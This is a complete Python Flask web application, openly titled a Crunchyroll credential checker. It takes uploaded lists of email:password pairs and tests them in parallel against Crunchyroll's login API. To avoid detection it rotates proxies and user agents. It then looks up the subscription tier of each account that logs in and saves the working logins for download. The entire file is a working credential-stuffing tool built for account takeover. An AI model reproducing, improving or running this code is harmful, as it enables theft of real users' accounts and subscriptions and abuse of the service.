#!/usr/bin/env python3
"""
Crunchyroll Credential Checker - Flask Web Application
A web-based tool to check Crunchyroll credentials with multi-threading support
"""

import os
import time
import json
import random
import requests
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template, request, jsonify, Response, send_file
from werkzeug.utils import secure_filename
from queue import Queue

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())

# Ensure upload directory exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Global variables
checker_instance = None
status_queue = Queue()

# User agents for random selection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]


class CrunchyrollCredentialChecker:
    """Main class for checking Crunchyroll credentials"""
    
    def __init__(self, combo_file, proxy_file=None, threads=10):
        self.combo_file = combo_file
        self.proxy_file = proxy_file
        self.threads = threads
        self.is_running = False
        self.credentials = []
        self.proxies = []
        self.valid_count = 0
        self.invalid_count = 0
        self.total_count = 0
        self.current_index = 0
        self.start_time = None
        self.valid_file = "valid_credentials.txt"
        self.lock = threading.Lock()  # Thread synchronization lock
        
    def load_credentials(self):
        """Load credentials from combo file"""
        try:
            with open(self.combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                self.credentials = [line.strip() for line in f if ':' in line.strip()]
            self.total_count = len(self.credentials)
            self.log_status(f"✅ Loaded {self.total_count} credentials")
            return True
        except Exception as e:
            self.log_status(f"❌ Error loading credentials: {str(e)}", "error")
            return False
    
    def load_proxies(self):
        """Load proxies from proxy file"""
        if not self.proxy_file or not os.path.exists(self.proxy_file):
            self.log_status("ℹ️ No proxy file provided, running without proxies")
            return
        
        try:
            with open(self.proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            self.log_status(f"✅ Loaded {len(self.proxies)} proxies")
        except Exception as e:
            self.log_status(f"⚠️ Error loading proxies: {str(e)}", "warning")
    
    def get_random_proxy(self):
        """Get a random proxy from the list"""
        if not self.proxies:
            return None
        
        proxy_string = random.choice(self.proxies)
        # Support formats: ip:port or ip:port:user:pass
        parts = proxy_string.split(':')
        
        if len(parts) == 2:
            return {
                'http': f'http://{proxy_string}',
                'https': f'http://{proxy_string}'
            }
        elif len(parts) == 4:
            ip, port, user, passwd = parts
            return {
                'http': f'http://{user}:{passwd}@{ip}:{port}',
                'https': f'http://{user}:{passwd}@{ip}:{port}'
            }
        return None
    
    def check_credential(self, credential):
        """Check a single credential"""
        if not self.is_running:
            return
        
        try:
            email, password = credential.split(':', 1)
        except ValueError:
            with self.lock:
                self.invalid_count += 1
                self.current_index += 1
            return
        
        max_retries = 3
        for attempt in range(max_retries):
            try:
                # Random user agent
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'application/json',
                }
                
                # Login data
                data = {
                    'username': email,
                    'password': password,
                    'grant_type': 'password',
                    'scope': 'offline_access'
                }
                
                # Get proxy if available
                proxies = self.get_random_proxy()
                
                # Make login request
                response = requests.post(
                    'https://beta-api.crunchyroll.com/auth/v1/token',
                    headers=headers,
                    data=data,
                    proxies=proxies,
                    timeout=10,
                    verify=True
                )
                
                if response.status_code == 200:
                    result = response.json()
                    
                    if 'access_token' in result:
                        # Get subscription info
                        subscription_info = self.get_subscription_info(result['access_token'], headers, proxies)
                        
                        with self.lock:
                            self.valid_count += 1
                            self.current_index += 1
                        
                        # Save valid credential (thread-safe file write)
                        with self.lock:
                            with open(self.valid_file, 'a', encoding='utf-8') as f:
                                f.write(f"{credential} | {subscription_info}\n")
                        
                        self.log_status(
                            f"✅ VALID: {email} | {subscription_info}",
                            "valid"
                        )
                        return
                
                # Invalid credential
                with self.lock:
                    self.invalid_count += 1
                    self.current_index += 1
                self.log_status(f"❌ INVALID: {email}", "invalid")
                return
                
            except requests.exceptions.RequestException as e:
                if attempt < max_retries - 1:
                    time.sleep(1)
                    continue
                else:
                    with self.lock:
                        self.invalid_count += 1
                        self.current_index += 1
                    self.log_status(f"⚠️ ERROR: {email} - {str(e)}", "error")
                    return
    
    def get_subscription_info(self, access_token, headers, proxies):
        """Get subscription information for a valid account"""
        try:
            headers['Authorization'] = f'Bearer {access_token}'
            
            response = requests.get(
                'https://beta-api.crunchyroll.com/subs/v1/subscriptions',
                headers=headers,
                proxies=proxies,
                timeout=10,
                verify=True
            )
            
            if response.status_code == 200:
                data = response.json()
                
                if 'items' in data and len(data['items']) > 0:
                    sub = data['items'][0]
                    tier = sub.get('tier', 'Unknown')
                    active = sub.get('is_active', False)
                    
                    if active:
                        return f"Premium ({tier})"
                    else:
                        return "Free"
                else:
                    return "Free"
            else:
                return "Unknown"
                
        except Exception:
            return "Unknown"
    
    def log_status(self, message, status_type="info"):
        """Log status message to queue"""
        status_queue.put({
            'message': message,
            'type': status_type,
            'timestamp': datetime.now().strftime('%H:%M:%S')
        })
    
    def start_checking(self):
        """Start the credential checking process"""
        self.is_running = True
        self.start_time = time.time()
        self.valid_count = 0
        self.invalid_count = 0
        self.current_index = 0
        
        # Clear valid file
        with open(self.valid_file, 'w') as f:
            pass
        
        # Load credentials and proxies
        if not self.load_credentials():
            self.is_running = False
            return
        
        self.load_proxies()
        
        self.log_status(f"🚀 Starting credential check with {self.threads} threads")
        
        # Use ThreadPoolExecutor for concurrent checking
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for credential in self.credentials:
                if not self.is_running:
                    break
                executor.submit(self.check_credential, credential)
        
        elapsed_time = time.time() - self.start_time
        self.log_status(
            f"✅ Checking complete! Valid: {self.valid_count} | Invalid: {self.invalid_count} | Time: {elapsed_time:.2f}s"
        )
        self.is_running = False
    
    def stop_checking(self):
        """Stop the credential checking process"""
        self.is_running = False
        self.log_status("⛔ Checking stopped by user")
    
    def get_stats(self):
        """Get current statistics"""
        with self.lock:
            elapsed_time = time.time() - self.start_time if self.start_time else 0
            speed = self.current_index / elapsed_time if elapsed_time > 0 else 0
            
            return {
                'total': self.total_count,
                'current': self.current_index,
                'valid': self.valid_count,
                'invalid': self.invalid_count,
                'speed': round(speed, 2),
                'elapsed': round(elapsed_time, 2),
                'is_running': self.is_running
            }


@app.route('/')
def index():
    """Main page"""
    return render_template('index.html')


@app.route('/upload', methods=['POST'])
def upload_files():
    """Handle file uploads"""
    try:
        combo_file = request.files.get('combo_file')
        proxy_file = request.files.get('proxy_file')
        
        if not combo_file:
            return jsonify({'success': False, 'message': 'Combo file is required'}), 400
        
        # Save combo file
        combo_filename = secure_filename(combo_file.filename)
        combo_path = os.path.join(app.config['UPLOAD_FOLDER'], combo_filename)
        combo_file.save(combo_path)
        
        result = {
            'success': True,
            'combo_file': combo_filename,
            'proxy_file': None
        }
        
        # Save proxy file if provided
        if proxy_file and proxy_file.filename:
            proxy_filename = secure_filename(proxy_file.filename)
            proxy_path = os.path.join(app.config['UPLOAD_FOLDER'], proxy_filename)
            proxy_file.save(proxy_path)
            result['proxy_file'] = proxy_filename
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@app.route('/start', methods=['POST'])
def start_checking():
    """Start the credential checking process"""
    global checker_instance
    
    try:
        data = request.get_json()
        combo_file = data.get('combo_file')
        proxy_file = data.get('proxy_file')
        threads = int(data.get('threads', 10))
        
        if not combo_file:
            return jsonify({'success': False, 'message': 'No combo file uploaded'}), 400
        
        combo_path = os.path.join(app.config['UPLOAD_FOLDER'], combo_file)
        
        if not os.path.exists(combo_path):
            return jsonify({'success': False, 'message': 'Combo file not found'}), 400
        
        # Stop existing checker if running
        if checker_instance and checker_instance.is_running:
            checker_instance.stop_checking()
            time.sleep(1)
        
        # Create new checker instance
        proxy_path = os.path.join(app.config['UPLOAD_FOLDER'], proxy_file) if proxy_file else None
        checker_instance = CrunchyrollCredentialChecker(combo_path, proxy_path, threads)
        
        # Start checking in a background thread
        thread = threading.Thread(target=checker_instance.start_checking)
        thread.daemon = True
        thread.start()
        
        return jsonify({'success': True, 'message': 'Checking started'})
        
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@app.route('/stop', methods=['POST'])
def stop_checking():
    """Stop the credential checking process"""
    global checker_instance
    
    if checker_instance:
        checker_instance.stop_checking()
        return jsonify({'success': True, 'message': 'Checking stopped'})
    
    return jsonify({'success': False, 'message': 'No active checking process'}), 400


@app.route('/status')
def status_stream():
    """Server-Sent Events endpoint for real-time updates"""
    def generate():
        while True:
            # Get stats
            if checker_instance:
                stats = checker_instance.get_stats()
                yield f"data: {json.dumps({'type': 'stats', 'data': stats})}\n\n"
            
            # Get log messages
            while not status_queue.empty():
                log_data = status_queue.get()
                yield f"data: {json.dumps({'type': 'log', 'data': log_data})}\n\n"
            
            time.sleep(0.5)
    
    return Response(generate(), mimetype='text/event-stream')


@app.route('/download')
def download_results():
    """Download valid credentials file"""
    try:
        if os.path.exists('valid_credentials.txt'):
            return send_file(
                'valid_credentials.txt',
                as_attachment=True,
                download_name='valid_credentials.txt'
            )
        else:
            return jsonify({'success': False, 'message': 'No results file found'}), 404
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


if __name__ == '__main__':
    print("=" * 60)
    print("🚀 Crunchyroll Credential Checker - Web Application")
    print("=" * 60)
    print("📱 Access on mobile: http://<your-ip>:5000")
    print("💻 Access on desktop: http://localhost:5000")
    print("=" * 60)
    # Use debug=False for production, True only for development
    debug_mode = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
    app.run(host='0.0.0.0', port=5000, debug=debug_mode, threaded=True)
